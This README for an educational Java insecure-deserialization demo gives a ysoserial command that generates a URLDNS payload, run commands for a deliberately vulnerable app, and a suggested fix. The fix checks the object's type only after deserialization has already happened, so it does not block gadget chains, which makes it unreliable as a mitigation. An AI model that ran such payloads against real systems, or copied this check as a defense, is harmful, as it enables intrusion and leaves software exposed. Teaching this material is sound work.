# Java-Insecure-Deserialisation-Attack Demo

## Overview
This project demonstrates the **Unsecure Deserialization Vulnerability** in Java applications, using a malicious payload generated with the `ysoserial` tool. The demo showcases:
- How deserialization of untrusted data can be exploited.
- The risks of unsafe deserialization.
- A secure solution to mitigate the vulnerability.

---

## Vulnerability Description
**Serialization** is the process of converting an object into a byte stream for storage or transfer. **Deserialization** is the reverse, reconstructing the object from the byte stream.

**Unsafe deserialization** occurs when untrusted data is deserialized without validation, allowing attackers to craft malicious payloads that can:
- Trigger unintended behavior (e.g., DNS queries, system crashes).
- Execute arbitrary code (Remote Code Execution, RCE).
- Leak sensitive information.

---

## Tools Used
- **Java SE 22**: The runtime environment for the demonstration.
- **ysoserial**: A tool to generate malicious serialized payloads.
- **commons-collections-3.2.2.jar**: Required for the deserialization process.
- **Visual Studio Code**: For code editing.

---

## Files in This Repository
- `VulnerableApp.java`: The vulnerable application that blindly deserializes untrusted data.
- `SecureApp.java`: The secure version of the application, implementing validation to mitigate the vulnerability.
- `payload.ser`: The malicious serialized payload generated using `ysoserial`.
- `commons-collections-3.2.2.jar`: Required library for deserialization.
- `README.md`: Documentation for the project.
- `presentation.pptx`: A PowerPoint presentation explaining the vulnerability, demonstration, and mitigation.

---

## Steps to Reproduce the Demo

### 1. Compile the Applications
```bash
javac VulnerableApp.java
javac SecureApp.java
```

### 2. Generate the Malicious Payload
Use `ysoserial` to create a serialized payload:
```bash
java --add-opens java.base/java.net=ALL-UNNAMED -jar ysoserial-all.jar URLDNS "http://example.com" > payload.ser
```

- **Purpose**: This generates a malicious object that triggers a DNS query to `http://example.com`.

### 3. Run the Vulnerable Application
Execute the vulnerable application with the malicious payload:
```bash
java -cp .;commons-collections-3.2.2.jar VulnerableApp payload.ser
```

- **Expected Output**:
  ```
  File Header: AC ED
  Deserialized object: {http://example.com=http://example.com}
  ```

- **Explanation**: The application deserializes the payload and triggers a DNS query, demonstrating the vulnerability.

### 4. Run the Secure Application
Execute the secure application with the same payload:
```bash
java SecureApp payload.ser
```

- **Expected Output**:
  ```
  Untrusted object detected! Aborting deserialization.
  ```

- **Explanation**: The secure application validates the input and prevents deserialization of untrusted objects.

---

## Mitigation Strategies
1. **Input Validation**:
   - Ensure only trusted object types are deserialized.
   - Example in `SecureApp.java`:
     ```java
     if (obj instanceof String) {
         System.out.println("Deserialized safe object: " + obj);
     } else {
         System.out.println("Untrusted object detected! Aborting.");
     }
     ```


## References
- [ysoserial GitHub Repository](https://github.com/frohoff/ysoserial)
- [OWASP: Insecure Deserialization](https://owasp.org/www-community/vulnerabilities/Insecure_Deserialization)
- [Apache Commons Collections Vulnerability](https://commons.apache.org/proper/commons-collections/release_3_2_2.html)

